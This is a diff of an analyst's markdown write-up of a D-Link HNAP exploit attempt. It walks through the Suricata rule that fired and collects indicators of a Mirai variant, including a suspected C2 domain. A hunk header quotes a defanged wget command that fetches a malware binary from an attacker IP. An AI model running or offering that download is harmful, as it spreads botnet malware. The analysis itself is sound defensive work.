@@ -7,7 +7,7 @@
     - This website has some great analysis on this vulnerability:
         - https://musteresel.github.io/posts/2018/03/exploit-hnap-security-flaw-dlink-dir-615.html
 
-Suricata Alert
+### Suricata Alert
 
 - The Rule that fired was the following:
  ```
@@ -16,7 +16,7 @@ Suricata Alert
 - Lets break this Suricata signature down.
     1. The rule is an "alert" rule looking at http traffic from any port inbound from the variable EXTERNAL_NET to the networks assigned to the variable HOME_NET on any port.
     2.  The flow is set to established which means it will only match on established connections. Direction is "to server." 
-    3. We set the urilen which sets a uri length of 7 characters. 
+    3. We see the "urilen" which sets a uri length of 7 characters. 
     4. We then see a sticky buffer of "http.method" which modifies the content "POST" which come after it. That is telling the logic to look in the http.method field for content of "POST." If the http.method field has a GET or any method other then POST, the logic won't continue to run and the rule won't fire. 
     5. We then see another sticky buffer of "http.uri." Again, this is giving a field for which to look for the content that follows it. In this case its saying look in the "http.uri" field for the content "/HNAP1/". You will notice that their is 7 characters in "/HNAP1/"
    6. We see "nocase" which sounds exactly what it does - makes it not case sensitive.
@@ -88,7 +88,7 @@ wget http://23.94.22[.]13/x86_64
     - If we look through all the strings we can see bots.infectedfam[.]cc This looks like potentially C2 domain. We should check that out later. 
 ![bots_infectedfam_cc_post.png](/.attachments/bots_infectedfam_cc_post-1e7ce95d-55de-4b0d-92dc-69b9b2f2ba99.png)
 
-### Next steps
+### Follow Up Analysis
 
 - At this point, We've collected a handful of IoC's. We have IP addresses(both from the original attack and the ones contained in the exploits). We have a domain. We also have some pretty unique strings we may be able to write a yara rule with down the road.  
 - Lets investigate that domain. 
@@ -103,7 +103,7 @@ https://www.joesandbox.com/analysis/576941/0/html
 
 ### What I'll be doing now.
 
-- GHIDRA - I'm no programmer or reverse engineer but I'd like to get even deeper on how this Mirai flavor is working. 
+- GHIDRA - I'm no programmer or reverse engineer but I'd like to get an even deeper understanding of how this Mirai flavor is working. 
 - Yara rules for detection. 
 
 ![Ghidra.png](/.attachments/Ghidra-1beaa57c-010a-4612-b0c4-46c43b4d57fe.png)
